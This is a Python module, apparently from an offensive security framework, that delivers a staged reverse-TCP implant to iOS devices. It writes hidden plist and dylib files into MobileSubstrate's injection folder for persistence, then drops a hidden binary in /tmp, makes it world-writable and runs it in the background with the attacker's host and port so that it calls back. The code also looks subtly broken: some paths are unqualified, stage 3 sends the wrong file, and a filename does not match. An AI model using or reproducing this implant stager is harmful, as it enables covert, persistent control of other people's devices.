#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import time

from core.badges import badges
from core.exceptions import exceptions

from data.exploit.ios.stager.ac1d_reverse_tcp.core.terminator import terminator

class stages:
    def __init__(self, client):
        self.client = client
        self.badges = badges()
        self.exceptions = exceptions()
        self.terminator = terminator()

        self.stage1_path = "data/exploit/ios/stager/ac1d_reverse_tcp/bin/stage1.plist"
        self.stage2_path = "data/exploit/ios/stager/ac1d_reverse_tcp/bin/stage2.dylib"
        self.stage3_path = "data/exploit/ios/acqd/reverse_tcp/bin/stage3.bin"

    def send_stage1(self):
        time.sleep(0.5)
        self.badges.output_process("Sending Stage 1...")
        if os.path.exists(stage1_path):
            implant_file = open(stage1_path, "rb")
            executable = implant_file.read()
            implant_file.close()
            instructions = ""
            instructions += "cat >/Library/MobileSubstrate/DynamicLibraries/.ac1d.plist"
            instructions += "\n"
            self.badges.output_process("Executing Stage 1...")
            self.client.send(instructions.encode())
            self.client.send(executable)
        else:
            raise self.exceptions.GlobalException

    def send_stage2(self):
        time.sleep(0.5)
        self.badges.output_process("Sending Stage 2...")
        if os.path.exists(stage2_path):
            implant_file = open(stage2_path, "rb")
            executable = implant_file.read()
            implant_file.close()
            instructions = ""
            instructions += "cat >/Library/MobileSubstrate/DynamicLibraries/.ac1d.dylib"
            instructions += "\n"
            self.badges.output_process("Executing Stage 2...")
            self.client.send(instructions.encode())
            self.client.send(executable)
        else:
            raise self.exceptions.GlobalException

    def send_stage3(self, local_host, local_port):
        time.sleep(0.5)
        self.badges.output_process("Sending Stage 2...")
        if os.path.exists(stage2_path):
            implant_file = open(stage2_path, "rb")
            executable = implant_file.read()
            implant_file.close()
            instructions = ""
            instructions += "cat >/tmp/.ac1d.bin;"
            instructions += "chmod 777 /tmp/.ac1d.bin;"
            instructions += f"sh -c '/tmp/.ac1d {self.terminator.encode_remote_data(local_host, str(local_port))}' 2>/dev/null &"
            instructions += "\n"
            self.badges.output_process("Executing Stage 2...")
            self.client.send(instructions.encode())
            self.client.send(executable)
        else:
            raise self.exceptions.GlobalException